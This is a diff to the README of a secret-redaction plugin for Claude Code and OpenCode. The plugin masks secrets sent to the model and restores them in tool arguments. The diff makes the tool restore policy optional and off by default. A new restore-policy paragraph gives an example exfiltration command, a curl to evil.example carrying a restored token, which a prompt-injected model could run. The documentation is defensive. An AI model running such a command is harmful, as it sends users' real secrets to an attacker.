@@ -45,7 +45,7 @@ Terminal / User          Local tool execution
 
 1. **Secure-by-default UI**: Canonical user messages and tool results remain redacted. There is no automatic assistant-response unmasking.
 2. **Memory broker**: One automatically started broker per OS user holds mappings in RAM. Clients communicate over a mode-`0600` Unix socket inside a mode-`0700` runtime directory. No plaintext vault file is written.
-3. **Tool Argument Restoration**: When the model issues a tool call containing masked values (e.g. `read("/home/__MASKED_USER_...__/config.json")`), arguments are recursively unmasked before local execution, if the [restore policy](#restore-policy) allows that tool. OpenCode cannot prompt from a server hook, so tools set to `ask` (Bash by default) are refused there.
+3. **Tool Argument Restoration**: When the model issues a tool call containing masked values (e.g. `read("/home/__MASKED_USER_...__/config.json")`), arguments are recursively unmasked before local execution. The optional [restore policy](#restore-policy) can limit which tools receive real values.
 4. **Unknown tokens pass through**: Tokens the session cannot resolve (expired, broker restarted, or from another session) are left as literal text, and the tool runs with them.
 5. **Confirmed reveal**: Press the reveal shortcut, approve the confirmation, and OpenCode shows mappings in a local dialog for 10 seconds. Press it again to hide immediately.
 6. **Selection scope**: If terminal text is selected, only mask tokens inside that selection are revealed. A selection containing no tokens never falls back to revealing the whole session.
@@ -57,7 +57,7 @@ Terminal / User          Local tool execution
 2. **Data Redaction (`PostToolUse`)**: Replaces secrets in tool outputs (files, commands, logs) with random opaque tokens before sending to Claude. If the broker is unavailable, secrets are replaced with irreversible `[REDACTED_<kind>]` markers instead of passing through.
 3. **Memory broker**: `SessionStart` starts or reuses the per-user broker; `SessionEnd` clears that session. No plaintext vault is written.
 4. **Terminal Unmasking (`MessageDisplay`)**: Restores original secrets in streamed responses so you read plain text.
-5. **Tool Unmasking (`PreToolUse`)**: Unmasks tokens before subsequent tool executions, following the [restore policy](#restore-policy): file tools run directly, web tools are denied, and anything else (such as Bash) asks you first. Tokens the session cannot resolve are left unchanged.
+5. **Tool Unmasking (`PreToolUse`)**: Unmasks tokens before subsequent tool executions so scripts and commands work. With the optional [restore policy](#restore-policy) switched on, file tools run directly, web tools are denied, and anything else (such as Bash) asks you first. Tokens the session cannot resolve are left unchanged.
 
 ---
 
@@ -90,25 +90,40 @@ To add custom patterns, modify or extend `patterns.json`. The shared broker load
 
 ### Restore policy
 
-`policy.json` decides which tools may run with real values restored in place of mask tokens:
+Restoring a token puts the real secret into whatever tool the model runs. That is what lets scripts and commands work, but it also means a prompt-injected model could run `curl https://evil.example/?k=<token>` and send the real value away. The restore policy limits which tools may receive real values.
+
+It is **off by default**: every tool gets real values, with no prompts. Switch it on in `policy.json` (installed next to the hooks, e.g. `.claude/hooks/secret-redactor/policy.json` or `.opencode/plugins/secret-redactor/policy.json`):
 
 ```json
 {
+  "enabled": true,
   "default": "ask",
   "tools": {
     "Read": "allow",
     "Write": "allow",
+    "Edit": "allow",
     "WebFetch": "deny",
+    "read": "allow",
     "bash": "allow"
   }
 }
 ```
 
+| Field | Meaning |
+|---|---|
+| `enabled` | `true` applies the rules below. `false` (or missing) restores into every tool. |
+| `default` | Decision for tools not listed in `tools`. |
+| `tools` | Per-tool decisions, keyed by exact tool name. |
+
+Decisions:
+
 - `allow`: restore silently.
 - `ask`: Claude Code asks you before the tool runs. OpenCode refuses, because its server hooks cannot prompt.
 - `deny`: refuse the tool call.
 
-Tool names are matched exactly, so list Claude Code names (`Bash`) and OpenCode names (`bash`) separately. Set `SECRET_REDACTOR_POLICY` to point the broker at a policy file outside the install directory, so reinstalling does not overwrite it.
+Tool names are case-sensitive and differ per client, so list both: Claude Code uses `Read`, `Write`, `Edit`, `MultiEdit`, `Bash`, `WebFetch`; OpenCode uses `read`, `write`, `edit`, `patch`, `bash`, `webfetch`. The bundled file already lists the file tools as `allow` and the web tools as `deny`, so switching `enabled` to `true` is usually enough.
+
+The broker reads the policy when it starts. After editing it, stop the broker (`pkill -f 'broker.py --serve'`); the next hook starts a fresh one. Reinstalling overwrites the bundled file, so to keep your own, put it elsewhere and set `SECRET_REDACTOR_POLICY=/path/to/policy.json` in the environment of Claude Code or OpenCode.
 
 ---
 
